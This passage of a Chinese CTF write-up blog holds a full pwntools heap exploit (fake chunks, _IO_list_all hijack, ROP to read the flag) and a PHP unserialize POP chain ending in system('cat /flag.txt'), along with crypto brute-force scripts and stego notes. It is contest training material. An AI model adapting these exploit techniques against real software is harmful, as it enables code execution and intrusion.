class="string">&#x27;31772&#x27;</span>)</span><br><span class="line">                offset = <span class="number">0x9b9</span> + <span class="number">0x6b</span></span><br><span class="line">                offset += x &lt;&lt; <span class="number">16</span></span><br><span class="line">                offset += y &lt;&lt; <span class="number">12</span></span><br><span class="line">                <span class="title function_">success</span>(<span class="string">&quot;try offset:\t&quot;</span> + <span class="title function_">hex</span>(offset))</span><br><span class="line">                <span class="title function_">main</span>(offset)</span><br><span class="line">                <span class="title function_">sleep</span>(<span class="number">0.2</span>)</span><br><span class="line">                p.<span class="title function_">sendline</span>(b<span class="string">&quot;cat flag&quot;</span>)</span><br><span class="line">                flag = p.<span class="title function_">recvline_contains</span>(b<span class="string">&quot;&#123;&quot;</span>, timeout = <span class="number">1</span>)</span><br><span class="line">                <span class="title function_">print</span>(flag)</span><br><span class="line">                p.<span class="title function_">interactive</span>()</span><br><span class="line">            except <span class="title class_">EOFError</span>:</span><br><span class="line">                p.<span class="title function_">close</span>()</span><br></pre></td></tr></table></figure>
<h3 id="qheap">qheap</h3>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> <span class="title class_">SomeofHouse</span> <span class="keyword">import</span> *</span><br><span class="line">context.<span class="title function_">update</span>(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">context.<span class="property">timeout</span> = <span class="number">5</span></span><br><span class="line"># context.<span class="property">log_level</span> = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.<span class="property">terminal</span> = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;split&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">binary = <span class="string">&#x27;./vuln&#x27;</span></span><br><span class="line">elf = <span class="title function_">ELF</span>(binary, checksec=<span class="title class_">False</span>)</span><br><span class="line"><span class="variable constant_">DEBUG</span> = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> <span class="attr">DEBUG</span>:</span><br><span class="line">    libc = elf.<span class="property">libc</span></span><br><span class="line">    p = <span class="title function_">process</span>(binary)</span><br><span class="line"><span class="attr">else</span>:</span><br><span class="line">    libc = <span class="title function_">ELF</span>(<span class="string">&#x27;./libc.so.6&#x27;</span>, checksec=<span class="title class_">False</span>)</span><br><span class="line">    host = <span class="string">&#x27;node1.tgctf.woooo.tech&#x27;</span></span><br><span class="line">    port = <span class="string">&#x27;32196&#x27;</span></span><br><span class="line">    # p = <span class="title function_">remote</span>(host,port)</span><br><span class="line"></span><br><span class="line">sla = lambda delim, <span class="attr">data</span>:     p.<span class="title function_">sendlineafter</span>(delim, data)</span><br><span class="line">sa  = lambda delim, <span class="attr">data</span>:     p.<span class="title function_">sendafter</span>(delim, data)</span><br><span class="line">s   = lambda <span class="attr">data</span>:            p.<span class="title function_">send</span>(data)</span><br><span class="line">sl  = lambda <span class="attr">data</span>:            p.<span class="title function_">sendline</span>(data)</span><br><span class="line">ru  = lambda delim, **<span class="attr">kwargs</span>: p.<span class="title function_">recvuntil</span>(delim, **kwargs)</span><br><span class="line">io  = <span class="attr">lambda</span>:                 p.<span class="title function_">interactive</span>()</span><br><span class="line">log = lambda name, <span class="attr">data</span>:      <span class="title function_">success</span>(f<span class="string">&#x27;&#123;name&#125;: &#123;data:#x&#125;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">def <span class="title function_">cmd</span>(idx):</span><br><span class="line">    <span class="title function_">sla</span>(b<span class="string">&#x27;&gt; &#x27;</span>, <span class="title function_">str</span>(idx).<span class="title function_">encode</span>())    </span><br><span class="line"></span><br><span class="line">def <span class="title function_">add1</span>(idx, size, data):</span><br><span class="line">    <span class="title function_">cmd</span>(<span class="number">1</span>)</span><br><span class="line">    <span class="title function_">sla</span>(b<span class="string">&#x27;Index: &#x27;</span>, <span class="title function_">str</span>(idx).<span class="title function_">encode</span>())</span><br><span class="line">    <span class="title function_">sla</span>(b<span class="string">&#x27;Size: &#x27;</span>, <span class="title function_">str</span>(size).<span class="title function_">encode</span>())</span><br><span class="line">    <span class="title function_">sa</span>(b<span class="string">&#x27;Data: &#x27;</span>, data)</span><br><span class="line"></span><br><span class="line">def <span class="title function_">delete1</span>(idx):</span><br><span class="line">    <span class="title function_">cmd</span>(<span class="number">2</span>)</span><br><span class="line">    <span class="title function_">sla</span>(b<span class="string">&#x27;Index: &#x27;</span>, <span class="title function_">str</span>(idx).<span class="title function_">encode</span>())</span><br><span class="line"></span><br><span class="line">def <span class="title function_">show</span>(idx):</span><br><span class="line">    <span class="title function_">cmd</span>(<span class="number">3</span>)</span><br><span class="line">    <span class="title function_">sla</span>(b<span class="string">&#x27;Index: &#x27;</span>, <span class="title function_">str</span>(idx).<span class="title function_">encode</span>())</span><br><span class="line"></span><br><span class="line">def <span class="title function_">edit</span>(idx, data):</span><br><span class="line">    <span class="title function_">cmd</span>(<span class="number">4</span>)</span><br><span class="line">    <span class="title function_">sla</span>(b<span class="string">&#x27;Index: &#x27;</span>, <span class="title function_">str</span>(idx).<span class="title function_">encode</span>())</span><br><span class="line">    <span class="title function_">sa</span>(b<span class="string">&#x27;Data: &#x27;</span>, data)</span><br><span class="line"></span><br><span class="line">def <span class="title function_">add2</span>(idx, sz, data):</span><br><span class="line">    <span class="title function_">cmd</span>(<span class="number">356781</span>)</span><br><span class="line">    <span class="title function_">sl</span>(b<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    <span class="title function_">sleep</span>(<span class="number">0.2</span>)</span><br><span class="line">    <span class="title function_">sl</span>(<span class="title function_">str</span>(idx).<span class="title function_">encode</span>())</span><br><span class="line">    <span class="title function_">sleep</span>(<span class="number">0.2</span>)</span><br><span class="line">    <span class="title function_">sl</span>(<span class="title function_">str</span>(sz).<span class="title function_">encode</span>())</span><br><span class="line">    <span class="title function_">sleep</span>(<span class="number">0.2</span>)</span><br><span class="line">    <span class="title function_">sl</span>(data)</span><br><span class="line">    <span class="title function_">sleep</span>(<span class="number">0.2</span>)</span><br><span class="line">    <span class="title function_">sl</span>(b<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line">def <span class="title function_">delete2</span>(idx):</span><br><span class="line">    <span class="title function_">cmd</span>(<span class="number">356781</span>)</span><br><span class="line">    <span class="title function_">sl</span>(b<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    <span class="title function_">sleep</span>(<span class="number">0.2</span>)</span><br><span class="line">    <span class="title function_">sl</span>(<span class="title function_">str</span>(idx).<span class="title function_">encode</span>())</span><br><span class="line">    <span class="title function_">sleep</span>(<span class="number">0.2</span>)</span><br><span class="line">    <span class="title function_">sl</span>(b<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line">def <span class="title function_">main</span>(offset):</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="title function_">range</span>(<span class="number">2</span>):</span><br><span class="line">        <span class="title function_">add1</span>(<span class="number">0</span>, <span class="number">0x20</span>, b<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="title function_">add2</span>(<span class="number">0</span>, <span class="number">0x20</span>, b<span class="string">&#x27;a&#x27;</span>*<span class="number">0x1f</span>)</span><br><span class="line">    <span class="title function_">add2</span>(<span class="number">1</span>, <span class="number">0x20</span>, b<span class="string">&#x27;a&#x27;</span>*<span class="number">0x1f</span>)</span><br><span class="line">    <span class="title function_">add2</span>(<span class="number">2</span>, <span class="number">0x20</span>, b<span class="string">&#x27;a&#x27;</span>*<span class="number">0x1f</span>)</span><br><span class="line">    <span class="title function_">add1</span>(<span class="number">3</span>, <span class="number">0x20</span>, b<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    # fake size</span><br><span class="line">    <span class="title function_">edit</span>(<span class="number">0</span>, b<span class="string">&#x27;\0&#x27;</span>*<span class="number">0x18</span> + <span class="title function_">p64</span>(<span class="number">0x51</span>))</span><br><span class="line"></span><br><span class="line">    <span class="title function_">delete1</span>(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    #fake size</span><br><span class="line">    <span class="title function_">add1</span>(<span class="number">1</span>, <span class="number">0x40</span>, b<span class="string">&#x27;\0&#x27;</span>*<span class="number">0x18</span> + <span class="title function_">p64</span>(<span class="number">0x31</span>))</span><br><span class="line">    <span class="title function_">delete1</span>(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">    # leak ld</span><br><span class="line">    <span class="title function_">edit</span>(<span class="number">1</span>, b<span class="string">&#x27;a&#x27;</span>*<span class="number">0x20</span>)</span><br><span class="line">    <span class="title function_">show</span>(<span class="number">1</span>)</span><br><span class="line">    <span class="title function_">ru</span>(b<span class="string">&#x27;a&#x27;</span>*<span class="number">0x20</span>)</span><br><span class="line">    key = <span class="title function_">u64</span>(p.<span class="title function_">recvn</span>(<span class="number">8</span>))</span><br><span class="line">    libc.<span class="property">address</span> = (key &lt;&lt; <span class="number">12</span>) - off<span class="keyword">set</span></span><br><span class="line">    <span class="title function_">log</span>(<span class="params"><span class="string">&#x27;libc&#x27;</span>, libc.address</span>)</span><br><span class="line"></span><br><span class="line">    # fix size</span><br><span class="line">    <span class="title function_">edit</span>(<span class="number">1</span>, b<span class="string">&#x27;\0&#x27;</span>*<span class="number">0x18</span> + <span class="title function_">p64</span>(<span class="number">0x31</span>))</span><br><span class="line">    <span class="title function_">add1</span>(<span class="number">2</span>, <span class="number">0x20</span>, b<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="title function_">delete1</span>(<span class="number">3</span>)</span><br><span class="line">    <span class="title function_">delete1</span>(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">    # leak heapbase</span><br><span class="line">    <span class="title function_">edit</span>(<span class="number">1</span>, b<span class="string">&#x27;a&#x27;</span>*<span class="number">0x20</span>)</span><br><span class="line">    <span class="title function_">show</span>(<span class="number">1</span>)</span><br><span class="line">    <span class="title function_">ru</span>(b<span class="string">&#x27;a&#x27;</span>*<span class="number">0x20</span>)</span><br><span class="line">    heapbase = (<span class="title function_">u64</span>(p.<span class="title function_">recvn</span>(<span class="number">8</span>)) ^ key) - <span class="number">0x9e0</span></span><br><span class="line">    heap4_addr = heapbase + <span class="number">0x1960</span></span><br><span class="line">    <span class="title function_">log</span>(<span class="string">&#x27;heapbase&#x27;</span>, heapbase)</span><br><span class="line"></span><br><span class="line">    # hijack fd</span><br><span class="line">    <span class="title function_">edit</span>(<span class="number">1</span>, b<span class="string">&#x27;\0&#x27;</span>*<span class="number">0x18</span> + <span class="title function_">fit</span>(<span class="number">0x31</span>, key ^ libc.<span class="property">sym</span>.<span class="property">_IO_list_all</span>))</span><br><span class="line"></span><br><span class="line">    <span class="title function_">add1</span>(<span class="number">2</span>, <span class="number">0x20</span>, b<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    <span class="title function_">add1</span>(<span class="number">3</span>, <span class="number">0x20</span>, <span class="title function_">p64</span>(heap4_addr)) # _IO_list_all</span><br><span class="line"></span><br><span class="line">    hos = <span class="title class_">HouseOfSome</span>(libc, libc.<span class="property">sym</span>.<span class="property">__free_hook</span>)</span><br><span class="line">    fake_io = hos.<span class="title function_">hoi_read_file_template</span>(</span><br><span class="line">        libc.<span class="property">sym</span>.<span class="property">__free_hook</span>, <span class="number">0x500</span>, libc.<span class="property">sym</span>.<span class="property">__free_hook</span>, <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    <span class="title function_">add1</span>(<span class="number">4</span>, <span class="number">0x100</span>, fake_io)</span><br><span class="line">    </span><br><span class="line">    <span class="title function_">cmd</span>(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">    stack = hos.<span class="title function_">bomb_raw</span>(p)</span><br><span class="line"></span><br><span class="line">    rop = <span class="title function_">ROP</span>(libc, stack)</span><br><span class="line">    rop.<span class="title function_">call</span>(<span class="string">&#x27;syscall&#x27;</span>, [<span class="number">2</span>, <span class="string">&#x27;./flag&#x27;</span>, <span class="number">0</span>])</span><br><span class="line">    rop.<span class="title function_">read</span>(<span class="number">3</span>, libc.<span class="property">sym</span>.<span class="property">__free_hook</span>, <span class="number">0x40</span>)</span><br><span class="line">    rop.<span class="title function_">write</span>(<span class="number">1</span>, libc.<span class="property">sym</span>.<span class="property">__free_hook</span>)</span><br><span class="line"></span><br><span class="line">    <span class="title function_">info</span>(rop.<span class="title function_">dump</span>())</span><br><span class="line">    pay = rop.<span class="title function_">chain</span>()</span><br><span class="line">    # gdb.<span class="title function_">attach</span>(p, <span class="string">&quot;b *_IO_do_write+177&quot;</span>)</span><br><span class="line">    <span class="title function_">sl</span>(pay)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    # <span class="title function_">pause</span>()</span><br><span class="line"></span><br><span class="line">    <span class="title function_">io</span>()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>: </span><br><span class="line">    # offset = <span class="number">0x292000</span> # local / remote <span class="number">0x282000</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="title function_">range</span>(<span class="number">0x10</span>):</span><br><span class="line">        <span class="keyword">for</span> y <span class="keyword">in</span> <span class="title function_">range</span>(<span class="number">0x10</span>):</span><br><span class="line">            <span class="attr">try</span>:</span><br><span class="line">                # p = <span class="title function_">process</span>(binary)</span><br><span class="line">                p = <span class="title function_">remote</span>(<span class="string">&quot;node1.tgctf.woooo.tech&quot;</span>, <span class="string">&#x27;32254&#x27;</span>)</span><br><span class="line">                # p = <span class="title function_">remote</span>(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="string">&#x27;9999&#x27;</span>)</span><br><span class="line">                offset = <span class="number">0x282000</span></span><br><span class="line">                offset += x &lt;&lt; <span class="number">16</span></span><br><span class="line">                offset += y &lt;&lt; <span class="number">12</span></span><br><span class="line">                <span class="title function_">success</span>(<span class="string">&quot;try offset:\t&quot;</span> + <span class="title function_">hex</span>(offset))</span><br><span class="line">                <span class="title function_">main</span>(offset)</span><br><span class="line">                <span class="title function_">sleep</span>(<span class="number">0.2</span>)</span><br><span class="line">                # p.<span class="title function_">sendline</span>(b<span class="string">&quot;cat flag&quot;</span>)</span><br><span class="line">                flag = p.<span class="title function_">recvline_contains</span>(b<span class="string">&quot;&#123;&quot;</span>, timeout = <span class="number">1</span>)</span><br><span class="line">                <span class="title function_">print</span>(flag)</span><br><span class="line">                p.<span class="title function_">interactive</span>()</span><br><span class="line">            except <span class="title class_">EOFError</span>:</span><br><span class="line">                p.<span class="title function_">close</span>()</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>题解</category>
      </categories>
  </entry>
  <entry>
    <title>2024浙江省赛决赛 全方向部分 WirteUp</title>
    <url>//post/2024zjctfjs/</url>
    <content><![CDATA[<h1>第七届浙江省大学生网络与信息安全竞赛决赛 WirteUp By A1natas</h1>
<h3 id="题目附件">题目附件</h3>
<p>链接: <a class="link"   href="https://pan.baidu.com/s/1AjtxVKSbWQjZRUXZg8d6Og?pwd=b8kf" >https://pan.baidu.com/s/1AjtxVKSbWQjZRUXZg8d6Og?pwd=b8kf<i class="fas fa-external-link-alt"></i></a> 提取码: b8kf</p>
<h3 id="签到">签到</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> DES3</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad, unpad</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">des_cbc_decode</span>(<span class="params">key, iv, cipher_data</span>):</span><br><span class="line">    des = DES3.new(key, mode=DES3.MODE_CBC, IV=iv)</span><br><span class="line">    result = des.decrypt(cipher_data)</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">lst = [<span class="string">&#x27;A&#x27;</span>,<span class="string">&#x27;B&#x27;</span>,<span class="string">&#x27;C&#x27;</span>,<span class="string">&#x27;D&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve</span>():</span><br><span class="line">    des_iv = <span class="string">b&quot;12345678&quot;</span></span><br><span class="line">    enc_hex = <span class="string">&quot;570fc2416dad7569c13356820ba67ba628c6a5fcbc73f1c8689612d23c3a779befeacf678f93ff5eb4b58dc09dcb9a89&quot;</span></span><br><span class="line">    enc_flag = <span class="built_in">bytes</span>.fromhex(enc_hex)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> itertools.product(lst, repeat=<span class="number">10</span>):</span><br><span class="line">        des_key = <span class="string">&#x27;&#x27;</span>.join(i)+<span class="string">&quot;000000&quot;</span></span><br><span class="line">        des_key = des_key.encode()</span><br><span class="line">        des_dec_data = des_cbc_decode(des_key, des_iv, enc_flag)</span><br><span class="line">        <span class="comment"># print(des_dec_data)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">b&quot;DASCTF&quot;</span> <span class="keyword">in</span> des_dec_data:</span><br><span class="line">            <span class="built_in">print</span>(des_dec_data)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    solve()</span><br><span class="line">    <span class="comment"># b&#x27;DASCTF&#123;Cyber_Security_2024_N1SC_Fina1_JiaY0u&#125;\x03\x03\x03&#x27;</span></span><br></pre></td></tr></table></figure>
<p><strong>DASCTF{Cyber_Security_2024_N1SC_Fina1_JiaY0u}</strong></p>
<h3 id="Web">Web</h3>
<h4 id="wucanrce">wucanrce</h4>
<p>无参数rce<br>
<img  
                       lazyload
                       alt="image"
                       data-src="https://s2.loli.net/2024/11/10/E1vGFxM32Iczr8R.png"
                        alt="image-20241109094836198-17311334955575"
                 ><br>
得到flag</p>
<h4 id="unserialize">unserialize</h4>
<p>先审计，发现利用链子就是：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AAA::__destruct()-&gt;AAA::__toString()-&gt;GGG::invoke()-&gt;EEE::get()</span><br></pre></td></tr></table></figure>
<p>md5比较写个脚本爆破</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">md5</span>(<span class="params">s</span>):</span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(s.encode()).hexdigest()</span><br><span class="line"></span><br><span class="line">t = <span class="string">&quot;666&quot;</span></span><br><span class="line">found = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> length <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">7</span>):</span><br><span class="line">    <span class="keyword">for</span> chars <span class="keyword">in</span> itertools.product(<span class="string">&#x27;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span>,</span><br><span class="line">                                   repeat=length):</span><br><span class="line">        test_str = <span class="string">&#x27;&#x27;</span>.join(chars)</span><br><span class="line">        hashed = md5(md5(test_str))</span><br><span class="line">        <span class="keyword">if</span> hashed.startswith(t):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Found match: <span class="subst">&#123;test_str&#125;</span> with MD5 hash: <span class="subst">&#123;hashed&#125;</span>&quot;</span>)</span><br><span class="line">            found = <span class="literal">True</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> found:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="comment"># Found match: eS with MD5 hash: 666adf7e8db0edc039faffa03fdcccd7</span></span><br></pre></td></tr></table></figure>
<p>然后后面的数组的这个逻辑</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">$this</span>-&gt;d[<span class="variable language_">$this</span>-&gt;e]=<span class="number">1</span>; <span class="comment"># array(1) &#123;[0]=&gt;int(1)&#125;</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;d[]=<span class="number">1</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;nononononnnn!!!&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;f);</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure>
<p>这里是试出来的，原本还想着用那个FFF递归把数组爆掉，发现想错了，只需要让数组插入1失败就行，直接赋值为NAN。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AAA</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$aear</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$string</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$a</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span> -&gt; aear = <span class="variable">$a</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span> -&gt; aear; <span class="comment">#触发 toString   step1</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$new</span> = <span class="variable language_">$this</span> -&gt; <span class="keyword">string</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$new</span>();  <span class="comment"># 触发 invoke</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BBB</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$pop</span>; <span class="comment"># 私有属性，跟get和set有关。</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$string</span></span>) </span>&#123; <span class="comment"># pop就传一个数组。</span></span><br><span class="line">        <span class="variable language_">$this</span> -&gt; pop = <span class="variable">$string</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$value</span></span>) </span>&#123; <span class="comment"># $value 就是$pop</span></span><br><span class="line">        <span class="variable">$var</span> = <span class="variable language_">$this</span> -&gt; <span class="variable">$value</span>;</span><br><span class="line">        <span class="variable">$var</span>[<span class="variable">$value</span>]();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DDD</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$bag</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$magazine</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$length</span> = @<span class="variable language_">$this</span> -&gt; bag -&gt; <span class="title function_ invoke__">add</span>();   <span class="comment"># step2</span></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$length</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$arg1</span>,<span class="variable">$arg2</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span> -&gt; magazine -&gt; tower)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;really??&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">EEE</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$d</span>=<span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$e</span>; <span class="comment"># 需要等于1</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$f</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$arg1</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;d[<span class="variable language_">$this</span>-&gt;e]=<span class="number">1</span>; <span class="comment"># array(1) &#123;[0]=&gt;int(1)&#125;</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;d[]=<span class="number">1</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;nononononnnn!!!&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;f);</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FFF</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$cookie</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">delete</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span> -&gt; cookie;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$args</span></span>) </span>&#123; <span class="comment">## step3</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;hahahhhh&#x27;</span>;</span><br><span class="line">        <span class="title function_ invoke__">call_user_func</span>([<span class="variable">$this</span>, <span class="variable">$func</span>.<span class="string">&quot;haha&quot;</span>], <span class="variable">$args</span>); <span class="comment"># 调用$this这个类的方法：$func.&quot;haha&quot;,参数是$args。递归会爆炸</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GGG</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$green</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$book</span>;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$fff</span> = <span class="keyword">new</span> <span class="title function_ invoke__">FFF</span>();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$eee</span> = <span class="keyword">new</span> <span class="title function_ invoke__">EEE</span>();</span><br><span class="line"><span class="variable">$eee</span>-&gt;d = NAN;</span><br><span class="line"><span class="variable">$eee</span>-&gt;e = NAN;</span><br><span class="line"><span class="variable">$eee</span>-&gt;f = <span class="string">&quot;system(&#x27;cat /flag.txt&#x27;);&quot;</span>;</span><br><span class="line"><span class="variable">$ggg</span> = <span class="keyword">new</span> <span class="title function_ invoke__">GGG</span>();</span><br><span class="line"><span class="variable">$ggg</span>-&gt;book = <span class="string">&quot;eS&quot;</span>;</span><br><span class="line"><span class="variable">$ggg</span>-&gt;green = <span class="variable">$eee</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$aaaa</span> = <span class="keyword">new</span> <span class="title function_ invoke__">AAA</span>(<span class="string">&quot;2&quot;</span>);</span><br><span class="line"><span class="variable">$aaaa</span>-&gt;<span class="keyword">string</span> = <span class="variable">$ggg</span>;</span><br><span class="line"><span class="variable">$aaa</span> = <span class="keyword">new</span> <span class="title function_ invoke__">AAA</span>(<span class="variable">$aaaa</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$aaa</span>));</span><br></pre></td></tr></table></figure>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://s2.loli.net/2024/11/10/6K4Yt3uARgp1Ckn.png"
                        alt="image-20241109142148338"
                 ></p>
<h3 id="Misc">Misc</h3>
<h4 id="FinalLogin">FinalLogin</h4>
<p>SNOW隐写了XOR密钥</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://s2.loli.net/2024/11/10/3uXIEJ2KagbQ7Cq.png"
                        alt="image-20241109091313041"
                 ></p>
<p>赛博厨子直接出</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://s2.loli.net/2024/11/10/rwTu2FflSVExdct.png"
                        alt="image-20241109091340198"
                 ></p>
<h4 id="非黑即白">非黑即白</h4>
<p>下载附件并解压得到一个逆序的gif图片，直接将图片逆序回来，然后用工具分帧</p>
<p><img  
                       lazyload
                       alt="image"
                       data-src="https://s2.loli.net/2024/11/10/muJgPt2Ljz7fwi8.png"
                        alt="image-20241109141605498"
                 ></p>
